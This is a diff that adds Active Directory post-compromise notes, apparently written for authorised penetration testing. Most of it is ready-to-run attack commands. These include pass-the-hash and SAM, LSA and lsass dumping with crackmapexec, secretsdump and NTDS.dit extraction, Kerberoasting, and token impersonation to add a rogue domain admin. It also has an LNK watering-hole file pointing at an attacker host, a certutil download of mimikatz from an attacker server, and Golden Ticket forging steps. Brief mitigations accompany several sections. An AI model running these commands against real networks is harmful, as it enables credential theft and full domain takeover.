@@ -535,3 +535,304 @@ Look for default credentials on web logins
 Think outside the box :)
 
 If nothing works and everything looks good, ask the client to possibly create credentials for us.
+
+### Post-Compromise AD Enumeration
+
+Get more information when you have an account.
+
+Quick enumeration methods:
+- ldapdomaindump
+- Bloodhound
+- Plumhound
+- PingCastle
+
+#### ldapdomaindump
+
+MitM6 does this automatically
+
+Steps:
+- Make a directory and `cd` into it.
+  - `mkdir [domain]`
+- Execute command with compromised account:
+  - `sudo python3 /usr/local/bin/ldapdomaindump ldaps://[DC-ip] -u '[user]' -p '[password]'`
+- Profit!
+
+#### Bloodhound
+
+Steps:
+- `cd /opt/bloodhound`
+- Start docker
+  - `sudo dockerd`
+- Start bloodhound
+  - `sudo docker-compose up`
+  - `sudo docker-compose pull && sudo docker-compose up` *(If experiencing issues)*
+- Go to `http://localhost:8080/ui`
+- Collect data
+  - `sudo bloodhound-python -d [domain] -u '[user]' -p '[password]' -ns [DC-ip] -c all`
+
+#### Plumhound
+
+Steps:
+- Have Bloodhound up
+- Test
+  - `sudo python3 PlumHound.py --easy -p bloodhoundcommunityedition`
+- Get reports
+  - `sudo python3 PlumHound.py -x tasks/default.tasks -p bloodhoundcommunityedition`
+- `cd reports`
+- `firefox index.html`
+
+### Post-Compromise Attacks
+
+What do we do after we have an account?
+
+#### Pass the Password / Pass the Hash
+
+Leverage password or hass and pass it around the domain.
+
+Utilize `crackmapexec`.
+
+Use:
+- `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -d [Domain] -p [password]`
+
+Get hashes:
+- Through metasploit hashdump
+- `secretsdump.py [Domain]/[user]:[password]@xxx.xxx.xxx.xxx`
+
+Use:
+- `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth`
+- Dump SAM
+  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --sam`
+- Enumerate shares
+  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --shares`
+- Dump LSA
+  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --lsa`
+- Dump lsass
+  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth -M lsassy` *(Can give hashes not in secretsdump)*
+
+Use `cmedb` do look at all crackmapexec uses and credentials.
+
+secretsdump is useful to dump all secrets on a device.
+- Password
+  - `secretsdump.py [Domain]/[user]:'[password]'@xxx.xxx.xxx.xxx`
+- Hash
+  - `secretsdump.py [user]:@xxx.xxx.xxx.xxx -hashes [hash]`
+
+Mitigations:
+- Limit account re-use
+- Utilize strong passwords
+- Privilege Access Management
+- LAPS
+
+#### Kerberoasting
+
+Ticket granting service is encrypted with the server's account hash.
+
+Steps:
+- Dump the hash
+  - `sudo python3 /home/kali/.local/bin/GetUserSPNs.py [Domain]/[user]:'[password]' -dc-ip [DC-ip] -request`
+- Crack that hash
+  - `hashcat -m 13100 [hash file] [wordlist]`
+
+Mitigations:
+- Strong passwords
+- Least privilege
+  - Service accounts should **not** be domain admin
+
+#### Token Impersonation
+
+Two types of tokens:
+- Delegate
+  - Created for logging into a machine or using RDP
+- Impersonate
+  - "non-interactive" such as attaching a network drive or a domain logon script
+
+We can attempt to dump hashes as a non-domain admin.
+
+If we have an admin, we can impersonate the user and dump hashes on the DC.
+
+We can create a domain admin to our domain and use that user to compromise the DC using secretsdump.
+
+Steps: *(Can use other tools, like mimikatz)*
+- `msfconsole`
+- Get a meterpreter shell
+  - `search psexec`
+  - `use exploit/windows/smb/psexec`
+- `load incognito`
+- `list_tokens -u`
+- `impersonate_token [Domain]\\[user]`
+- Stop impersonation:
+  - `rev2self`
+- When impersonating a DA
+  - `shell`
+  - `net user /add [user] [password] /domain`
+  - `net group "Domain Admins" hawkeye /ADD /DOMAIN`
+  - Can now `secretsdump` the DC with this user.
+
+Mitigations:
+- Limit user/group token creation permission
+- Best practices:
+  - Account tiering
+  - Local admin restriction
+
+#### LNK File Attacks
+
+Set up a watering hole.
+
+Dump a malicious file into a file share by entering commands in powershell:
+- `$objShell = New-Object -ComObject WScript.shell`
+- `$lnk = $objShell.CreateShortcut("C:\test.lnk")`
+- `$lnk.TargetPath = "\\[Attacker ip]\@test.png"`
+- `$lnk.WindowStyle = 1`
+- `$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"`
+- `$lnk.Description = "Test"`
+- `$lnk.HotKey = "Ctrl+Alt+T"`
+- `$lnk.Save()`
+- Edit the file name to include an `@` symbol as its first symbol.
+
+If responder is up and the file is loaded we can capture a hash.
+- `sudo responder -I eth0 -dPv`
+
+Can also use `netexec` or `crackmapexec` to do this:
+- `netexec smb xxx.xxx.xxx.xxx -d [Domain] -u [user] -p [password] -M slinky -o NAME=test SERVER=[Attacker ip]`
+
+#### GPP Attack (cPassword Attacks)
+
+The key to cPassword was accidentally released. Patched in MS14-025, but it doesn't prevent previous uses.
+
+Given a cPassword hash you can do the following
+- gpp-decrypt [hash]
+
+Given credentials, use metasploit `search gpp` with valid domain credentials.
+
+Mitigations:
+- Patch!
+- Delete the old GPP xml files stored in the SYSVOL
+
+#### Mimikatz
+
+Tool used to view and steal credentials, generate Kerberos tickets and leverage attacks.
+
+Will get picked up by anti-virus.
+
+Dump credentials stored in memory.
+
+Many options:
+- Credential dumping
+- Pass-the-Hash
+- Over-Pass-the-Hash
+- Pass-the-Ticket
+- Silver Ticket
+- Golden Ticket
+
+**This will get picked up by antivirus**
+
+Steps
+- Host http server to download files to device
+  - `python3 -m http.server 80` in mimikatz directory
+  - Get a shell on device
+  - `certutil.exe -urlcache -f "http://192.168.4.8/mimikatz.exe" mimikatz.exe` in writeable folder
+- Execute `mimikatz.exe`
+- `privilege::` -> `privilege::debug`
+- `sekurlsa::logonPasswords`
+
+#### Post-Compromise Attack Strategy
+
+We have an account, now what?
+- Quick wins!
+  - Kerberoasting
+  - secretsdump
+  - Pass the Hash / Pass the Password
+- No quick wins? Dig deep!
+  - Enumerate (Bloodhound, ldapdomaindumps, etc.)
+  - Where does your account have access?
+    - File shares, look at sensitive files!
+    - Login to different areas
+  - Old vulnerabilities die hard
+- Think outside the box!
+
+### We've compromised the Domain - Now What?
+
+Provide as much value to the client as possible
+- Put your blinders on and do it again
+- Dump the `NTDS.dit` and crack passwords
+- Enumerate shares for sensitive information
+
+Persistence can be important
+- What happens if our DA access is lost?
+- Creating a DA account can be useful **(Do not forget to delete it)**
+- Creating a Golden Ticket can be useful too
+
+#### Dump the NTDS.dit
+
+This is a database used to store AD data
+
+Use secretsdump against the DC with a known DA credential.
+- `secretsdump.py [Domain]/[user]:'[password]'@[DC-ip]`
+- `secretsdump.py [Domain]/[user]:'[password]'@[DC-ip] -just-dc-ntlm`
+- Crack dem hashes!
+
+#### Golden Ticket Attacks
+
+When we compromise the krbtgt account, we own the domain.
+- Grants Kerberos tickets
+- We can request access to any resource or system on the domain
+- Golden Tickets = Completes access to every machine
+
+Use mimikatz
+- Perform an `lsadump`.
+- Needed:
+  - krbtgt NTLM hash
+  - krbtgt S-ID
+- With golden ticket, act as any machine.
+
+Steps:
+- Run `mimikatz.exe` on the DC
+- `privilege::debug`
+- `lsadump::lsa /inject /name:krbtgt`
+  - Copy S-ID
+  - Copy NTLM hash
+- `kerberos::golden /User:Administrator /domain:[domain] /sid:[sid example: S-1-5-21-4072630234-3903147458-2387749885] /krbtgt:[hash] /id:500 /ptt`
+- Load `psexec.exe` to the DC
+- `psexec.exe \\[target ip] cmd.exe`
+
+#### Additional Active Directory Attacks
+
+Recent and relevant vulnerabilities. Only use these as a last measure as they can bring down the entire domain.
+
+Ask yourself:
+- Should I run this attack?
+  - ZeroLogon (NO!)
+  - PrintNightmare
+  - Sam the Admin
+- Run checkers on these exploits
+
+##### Zero Logon (CVE-2020-1472)
+
+Attack domain controller, set the password to `null` and take over the DC. If you do not restore the password, you break the DC.
+
+Steps (to check):
+- `cd /opt/ZeroLogonTester/CVE-2020-1472`
+- `python3 zerologon_tester.py [DC name] [DC ip]`
+
+##### PrintNightmare (CVE-2021-1675)
+
+Check for vulnerability:
+- `rpcdump.py @[DC ip] | egrep 'MS-RPRN|MS-PAR'`
+
+### AD Case Study Notes
+
+#### AD Case Study 1
+
+Sometimes you don't need domain accounts to compromise the domain controller.
+
+#### AD Case Study 2
+
+Look for initial access using default credentials, possibly on websites. Maybe there is even a password in cleartext?
+
+Look for old devices which may have WDigest enabled on them!
+
+#### AD Case Study 3
+
+Look into file shares, especially if someone has permission to many file shares!
+
+**KEEP ENUMERATING!**
